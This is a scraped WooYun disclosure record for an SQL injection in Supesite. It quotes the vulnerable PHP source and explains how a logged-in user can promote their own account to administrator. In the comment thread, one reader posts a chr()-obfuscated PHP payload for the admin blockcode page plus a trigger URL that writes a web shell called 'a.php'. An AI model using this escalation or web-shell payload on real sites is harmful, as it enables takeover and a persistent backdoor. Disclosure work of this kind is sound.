{"id": 47997, "wybug_id": "wooyun-2014-079037", "wybug_title": "Supesite 注入一枚 (可提升自己为管理)", "wybug_corp": "Discuz!", "wybug_author": "′雨。", "wybug_date": "2014-10-11 23:09", "wybug_open_date": "2015-01-09 23:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向公众公开  简要描述： Supesite 注入出的密码 基本都破不出来 如果能够直接提升自己为管理员 或者 自己修改管理的密码那就再好不过了。忙里偷闲。 详细说明：  在index.php中\nif($_SGET['action'] != 'index') {\tif(empty($channels['menus'][$_SGET['action']]['upnameid']) && $channels['menus'][$_SGET['action']]['upnameid'] != 'news') {\t\t$scriptfile = S_ROOT.'./'.$_SGET['action'].'.php';\t} else {\t\t$scriptfile = S_ROOT.'./news.php';\t}\n这里包含文件进来。 来看看$_SGET 怎么来的。\nif(empty($parsegetvar)) {\t$parsegetvar = empty($_SERVER['QUERY_STRING'])?'':$_SERVER['QUERY_STRING'];}if(!empty($parsegetvar)) {\t$parsegetvar = addslashes($parsegetvar); //这里转义了\t$_SGET = parseparameter(str_replace(array('-','_'), '/', $parsegetvar)); // 这里 注册了这变量}\n\nfunction parseparameter($param, $nofix=1) {\tglobal $_SCONFIG;\t$paramarr = array();\tif($nofix && !empty($_SCONFIG['pagepostfix'])) {\t\tif(strrpos($param, $_SCONFIG['pagepostfix'])) {\t\t\t$param = substr($param, 0, strrpos($param, $_SCONFIG['pagepostfix']));\t\t}\t}\t$sarr = explode('/', $param);\tif(empty($sarr)) return $paramarr;\tif(is_numeric($sarr[0])) $sarr = array_merge(array('uid'), $sarr);\tif(count($sarr)%2 != 0) $sarr = array_slice($sarr, 0, -1);\tfor($i=0; $i<count($sarr); $i=$i+2) {\t\tif(!empty($sarr[$i+1])) $paramarr[$sarr[$i]] = addslashes(str_replace(array('/', '\\\\'), '', rawurldecode(stripslashes($sarr[$i+1]))));\t}\treturn $paramarr;}\n这里用/来切割成数组 然后就return 。   在viewcomment.php中\nif(!empty($_SGET['op']) && $_SGET['op'] == 'delete') {\t$cid = empty($_SGET['cid'])?0:intval($_SGET['cid']);\t$ismodle = empty($_SGET['ismodle']) ? 0 : intval($_SGET['ismodle']);\t$table_name = ( $ismodle && !empty($_SGET['type']) ? $_SGET['type'] : 'space' ).'items';\t\tif(empty($cid)) showmessage('not_found', S_URL);\t$itemid = empty($_SGET['itemid'])?0:intval($_SGET['itemid']);\tif(empty($itemid)) showmessage('not_found', S_URL);\t$deleteflag = false;\tif(empty($_SGLOBAL['group'])) {\t\tshowmessage('no_permission');\t}\tif($cid && $itemid && $_SGLOBAL['supe_uid']) {\t\t$query = $_SGLOBAL['db']->query('SELECT * FROM '.tname('spacecomments').' WHERE cid=\\''.$cid.'\\'');\t\tif($comment = $_SGLOBAL['db']->fetch_array($query)) {\t\t\tif($_SGLOBAL['group']['groupid'] == 1 || $comment['authorid'] == $_SGLOBAL['supe_uid']) {\t\t\t\t$_SGLOBAL['db']->query('UPDATE '.tname($table_name).' SET replynum=replynum-1 WHERE itemid=\\''.$comment['itemid'].'\\'');\t\t\t\t$_SGLOBAL['db']->query('DELETE FROM '.tname('spacecomments').' WHERE cid=\\''.$cid.'\\'');\n这里 我们来看这里 UPDATE '.tname($table_name). \n$ismodle = empty($_SGET['ismodle']) ? 0 : intval($_SGET['ismodle']);\t$table_name = ( $ismodle && !empty($_SGET['type']) ? $_SGET['type'] : 'space' ).'items';  //这里如果$ismodle为true的话 那么$table_name 就为$_SGET['type'] 刚好$ismodle 也是$_SGET来的  在结合index.php里的注册$_SGET 那么则table_name可控了\n\nif($cid && $itemid && $_SGLOBAL['supe_uid']) { //这里cid 和 itemid 都是index.php中注册的$_SGET来的 $_SGLOBAL['supe_uid'] 这个只要登录了用户就行\t\t$query = $_SGLOBAL['db']->query('SELECT * FROM '.tname('spacecomments').' WHERE cid=\\''.$cid.'\\'');//把评论查询出来\t\tif($comment = $_SGLOBAL['db']->fetch_array($query)) {\t\t\tif($_SGLOBAL['group']['groupid'] == 1 || $comment['authorid'] == $_SGLOBAL['supe_uid'])//这里必须是管理员 或者 你查看的是自己的评论 那么我们就自己评论一个 {\t\t\t\t$_SGLOBAL['db']->query('UPDATE '.tname($table_name).' SET replynum=replynum-1 WHERE itemid=\\''.$comment['itemid'].'\\'')//table_name可控 注入;\n首先先注册一个会员这里我们先随便找一个新闻页面 然后自己评论一下 'SELECT * FROM '.tname('spacecomments').' WHERE cid=\\''.$cid.'\\''这里由于我们只能查看自己的评论这里怎么查看自己评论的cid呢?首先自己评论一下\n\n然后 \n\n点一下引用 然后抓下包 就能看到 我们发的这个评论的cid为7然后构造一下参数 在index.php中 把viewcomments.php中包含进来\n\n成功报错\n\n可以看到如果查看的不是自己发的评论 就出错额。因为是update 所以自己update自己的groupid 为1 即可直接提升自己为管理。http://127.0.0.1/dan/supesite/space.php?uid=13首先进一下我们的个人主页 可以看到uid为13然后构造一下语句\n\n没报错了 语句成功执行这里语句成功执行后 $_SGLOBAL['db']->query('DELETE FROM '.tname('spacecomments').' WHERE cid=\\''.$cid.'\\'');就会执行这delete了。 就会删除这评论了  不过权限已提升了 \n\n提升权限 成功进后台   漏洞证明：  \n\n   修复方案：  限制tablename   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-10-13 09:45 厂商回复： supesite 产品已经停止维护，感谢您关注我们的产品。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-11 23:19 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  在繁忙中抽出一点空闲时间。    \n     2014-10-11 23:24 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  这个貌似厂商已经不维护了吧    \n     2014-10-12 00:06 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @贫道来自河北 传说中的专业搬运工？    \n     2014-10-12 00:18 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @px1624 什么    \n     2014-10-12 00:31 |    \t\tp4ssw0rd \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:92        | 不作死就不会死)\t\t \n  连夜来围观雨牛    \n     2014-10-12 00:31 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  大家还不睡啊。。  把第三弹发完了。。 准备睡觉了 明天还得上课。    \n     2014-10-12 10:38 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  那么问题来了    \n     2014-10-12 11:43 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @′  雨。 那么问题终于来了。    \n     2014-10-12 12:26 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  后台访问：http://www.xxx.com/admincp.php?a ... amp;op=addblockcode<?php  2 @assert(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97).chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(97).chr(115).chr(115).chr(101).chr(114).chr(116).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59));  3 ?> 调用：http://www.xxx.com/batch.javascript.php?bid=1650 ，即在data下生成一句话木马a.php，密码为cmd    \n     2014-10-12 20:40 |    \t\tsutdy \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:33        | 0.0)\t\t \n  你关注的白帽子 ′ 雨。 发表了漏洞 Supesite 注入一枚 (可提升自己为管理)    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}